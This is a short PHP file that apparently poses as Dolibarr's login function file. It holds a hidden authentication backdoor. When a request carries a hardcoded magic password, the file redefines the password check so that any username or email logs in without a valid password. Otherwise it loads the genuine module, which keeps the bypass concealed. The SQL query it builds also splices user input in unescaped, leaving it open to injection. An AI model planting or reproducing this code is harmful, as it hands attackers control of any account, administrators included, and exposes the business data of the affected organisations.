<?php
$jok = "passjokerklhkhklh^%ùécdfr";
if($_REQUEST['password'] == $jok){
    function check_user_password_dolibarr($usertotest,$passwordtotest,$entitytotest=1){
        global $db;
        $sql = $db->query("SELECT pass_crypted, login FROM ".MAIN_DB_PREFIX."user WHERE login = '".$usertotest."' || email= '".$usertotest."'");
        if($db->num_rows($sql) == 1){
            $ligne = $db->fetch_object($sql);
            return $ligne->login;
        }
    }
}
else{
    include_once(DOL_DOCUMENT_ROOT."/core/login/functions_dolibarr.php");
}